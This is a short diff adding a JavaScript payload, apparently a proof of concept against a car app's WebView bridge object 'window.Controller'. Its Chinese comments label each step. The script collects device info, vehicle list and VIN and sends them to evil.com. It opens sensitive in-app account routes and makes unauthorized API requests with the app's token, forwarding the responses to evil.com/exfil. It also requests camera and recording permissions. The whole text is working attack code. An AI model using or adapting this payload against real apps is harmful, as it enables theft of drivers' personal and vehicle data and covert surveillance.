@@ -1,0 +1,18 @@
+<script>
+// 1. 窃取设备 + 车辆信息
+let info = window.Controller.appInfo({});
+let cars = window.Controller.getAllCarsInfo({});
+let vin = window.Controller.defaultCarVin({});
+navigator.sendBeacon('https://evil.com/collect', JSON.stringify({info,cars,vin}));
+
+// 2. 任意路由拉起敏感页面
+window.Controller.pushNativeController({url:"sapp://app/account/xxx"});
+
+// 3. 越权 HTTP 请求（借 App token）
+window.Controller.requestData({
+  hostType:"ntsp", method:"get", host:"https://api.gwm.com", url:"/sensitive/endpoint"
+}, function(res){ navigator.sendBeacon('https://evil.com/exfil', JSON.stringify(res)); });
+
+// 4. 申请相机/录音权限
+window.Controller.requestPermission({permissionType:2});
+</script>
